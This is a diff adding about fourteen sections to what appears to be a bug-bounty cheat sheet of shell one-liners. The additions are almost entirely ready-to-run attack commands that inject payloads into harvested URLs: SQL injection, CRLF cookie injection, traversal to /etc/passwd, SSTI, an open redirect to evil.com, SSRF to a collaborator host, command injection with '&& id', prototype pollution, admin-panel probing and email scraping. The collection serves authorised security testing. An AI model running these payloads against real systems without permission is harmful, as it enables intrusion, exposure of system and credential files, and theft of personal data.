@@ -939,3 +939,72 @@ cat all_urls.txt | gf deserialize | qsreplace 'evil_pickle_payload_here' | httpx
 cat all_urls.txt | gf sqli | qsreplace "' OR 1=1 --" | httpx -silent -fr 'syntax|sql|error|database' -o sql_injection.txt
 ```
 
+### Version Disclosure Detection
+```bash
+cat all_urls.txt | httpx -silent -hdrs | grep -Ei 'server:|x-powered-by:' | tee version_disclosures.txt
+```
+
+### CRLF Injection with Cookie Injection Check
+```bash
+cat all_urls.txt | gf crlf | qsreplace '%0d%0aSet-Cookie:+crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_cookie_injection.txt
+```
+
+### Directory Traversal Finder
+```bash
+cat all_urls.txt | qsreplace '../../etc/passwd' | httpx -silent -fr 'root:x' -o dir_traversal.txt
+```
+
+### Azure Storage Enumeration
+```bash
+subfinder -d target.com | sed 's/$/.blob.core.windows.net/' | httpx -silent -mc 200 -o open_azure_blobs.txt
+```
+
+### Subdomain Takeover Detection (CNAME Pointing to Unclaimed Services)
+```bash
+subfinder -d target.com | dnsx -silent -a -resp-only | nuclei -silent -t takeover-detection/ -o takeover_candidates.txt
+```
+
+### Unauthorized Admin Panel Access
+```bash
+cat all_urls.txt | httpx -silent -path-list <(echo -e '/admin\n/dashboard\n/cms\n/panel\n/root\n/console') -mc 200 -o exposed_admins.txt
+```
+
+### IPv6 Asset Discovery (Many Orgs Forget This)
+```bash
+subfinder -d target.com | dnsx -silent -aaaa -resp-only | tee ipv6_assets.txt
+```
+
+### Template Injection Finder (SSTI)
+```bash
+cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_vulns.txt
+```
+
+### Open Redirect Detection
+```bash
+cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'Location: https://evil.com' -o open_redirects.txt
+```
+
+### Server-Side Request Forgery (SSRF)
+```bash
+cat all_urls.txt | gf ssrf | qsreplace 'http://your-burpcollab-url.burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt
+```
+
+### Exposed .git Repositories (Code Leakage)
+```bash
+cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git_repos.txt
+```
+
+### Command Injection Finder
+```bash
+cat all_urls.txt | gf cmd-injection | qsreplace '&& id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
+```
+
+### Prototype Pollution Detection
+```bash
+cat all_urls.txt | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
+```
+
+### Email/PII Leakage in Responses
+```bash
+cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
+```
